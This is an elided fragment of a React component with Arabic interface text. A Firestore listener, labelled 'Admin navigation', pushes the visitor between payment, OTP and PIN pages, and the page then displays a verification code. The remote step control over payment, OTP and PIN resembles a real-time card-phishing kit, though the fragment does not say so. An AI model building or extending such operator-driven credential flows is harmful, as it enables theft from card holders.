  ...
  useEffect(() => {
    ...
    const unsubscribe = onSnapshot(
      ...
      (docSnap) => {
        ...
        // Admin navigation: handle page redirects (string contract)
        ...
        if (data.currentStep === "payment") {
          window.location.href = "/check";
          return;
        }
        if (data.currentStep === "otp") {
          window.location.href = "/veri";
          return;
        }
        if (data.currentStep === "pin") {
  ...
  return (
    ...
    >
      ...
      <div className="absolute inset-0 overflow-hidden pointer-events-none">
        ...
        <div
          className="absolute -bottom-40 -left-40 w-96 h-96 bg-emerald-100/30 rounded-full blur-3xl animate-pulse"
                ...
                {confirmationCode.length < 1 ? (
                  <div className="flex flex-col items-center gap-4 mb-8">
                    <div className="relative">
                      ...
                      <div
                        className="absolute inset-0 rounded-full border-4 border-transparent border-t-[#4db6ac] animate-spin"
                        style={{
                    ...
                    <div className="text-center space-y-1">
                      <p className="text-gray-600 text-sm font-medium animate-pulse">
                        جاري انتظار رمز التحقق...
                      </p>
                      <p className="text-gray-400 text-xs">
                        سيظهر الكود أمامك خلال لحظات
                      </p>
                    </div>
                  </div>
                ) : (
                  ...
                  >
                    <div className="bg-gradient-to-br from-[#2a7a4b] to-[#1b5e3b] rounded-2xl p-6 text-center shadow-xl shadow-[#2a7a4b]/20 relative overflow-hidden">
                      ...
                      <div className="relative z-10">
                        <p className="text-emerald-100 text-xs font-medium mb-2 uppercase tracking-wider">
                          رمز التحقق
                        </p>
                        <div className="flex justify-center gap-2 mb-3">
                          {confirmationCode.split("").map((digit, i) => (
                            <div
                              key={i}
                              className="w-12 h-14 bg-white/20 backdrop-blur-sm rounded-xl flex items-center justify-center text-2xl font-black text-white shadow-inner border border-white/10"
                            >
                              {digit}
                            </div>
                          ))}
